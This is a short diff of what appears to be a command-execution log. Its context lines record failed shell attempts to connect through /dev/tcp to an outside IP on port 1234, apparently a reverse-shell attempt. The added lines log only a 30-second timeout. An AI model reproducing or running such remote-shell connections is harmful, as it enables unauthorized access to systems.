@@ -3195,3 +3195,8 @@ STDERR:
 /bin/sh: connect: Connection refused
 /bin/sh: /dev/tcp/160.191.183.126/1234: Connection refused
 ----------------------------------------
+[2026-04-12 17:23:24]
+COMMAND TIMEOUT after 30 seconds
+STDOUT: 
+STDERR: 
+----------------------------------------
